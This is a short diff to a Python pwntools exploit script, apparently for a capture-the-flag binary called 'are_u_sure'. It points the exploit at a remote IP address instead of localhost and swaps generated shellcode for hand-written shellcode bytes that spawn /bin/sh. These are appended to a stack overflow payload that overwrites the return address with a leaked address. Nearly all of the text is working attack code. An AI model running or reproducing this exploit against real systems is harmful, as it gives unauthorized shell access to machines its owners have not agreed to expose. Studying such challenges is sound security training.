@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 from pwn import *
 
-host = "localhost"
+host = "67.205.174.218"
 port = 8001
 binary_path = "./are_u_sure"
 lib_path = None
@@ -32,7 +32,8 @@ name_addr = p.recvuntil(" if you're looking for it.", drop=True)
 name_addr = int(name_addr, 16)
 print(hex(name_addr))
 
-payload += asm(shellcraft.execve("/bin/sh", 0, 0))
+#payload += asm(shellcraft.execve("/bin/sh", 0, 0))
+payload += 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
 payload = payload.ljust(120, 'A')
 payload += p64(name_addr - 0x30)
 
